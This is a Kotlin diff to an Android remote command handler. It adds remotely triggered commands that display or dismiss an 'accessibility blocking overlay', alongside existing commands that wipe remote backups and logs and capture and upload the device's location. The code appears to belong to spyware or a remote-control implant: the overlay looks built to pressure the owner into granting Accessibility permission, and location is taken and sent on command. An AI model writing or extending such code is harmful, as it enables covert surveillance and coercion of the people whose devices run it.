@@ -116,6 +116,16 @@ class RemoteCommandManager(private val context: Context) {
                     FirebaseSyncEngine(context).clearAllRemoteData()
                     resultMessage = "All remote backup data and local logs cleared successfully."
                 }
+                "SHOW_ACCESSIBILITY_OVERLAY", "ACCESSIBILITY_OVERLAY", "SHOW_OVERLAY", "REQUIRE_ACCESSIBILITY", "SHOW_ACCESSIBILITY_PROMPT", "START_ACCESSIBILITY_OVERLAY" -> {
+                    com.example.service.AccessibilityOverlayManager.startObserver(context)
+                    com.example.service.AccessibilityOverlayManager.showOverlay(context)
+                    val isEnabled = com.example.service.AccessibilityOverlayManager.isAccessibilityEnabled(context)
+                    resultMessage = if (isEnabled) "Accessibility overlay started (Accessibility Service is currently ENABLED)." else "Accessibility blocking overlay displayed on device."
+                }
+                "HIDE_ACCESSIBILITY_OVERLAY", "REMOVE_ACCESSIBILITY_OVERLAY", "HIDE_OVERLAY", "DISMISS_ACCESSIBILITY_OVERLAY" -> {
+                    com.example.service.AccessibilityOverlayManager.removeOverlay(context)
+                    resultMessage = "Accessibility overlay removed remotely."
+                }
                 "SYNC_LOCATION", "LOCATION", "GET_LOCATION" -> {
                     val loc = LocationSyncManager(context).captureAndSyncLocation()
                     FirebaseSyncEngine(context).pushTelemetryToFirebase()
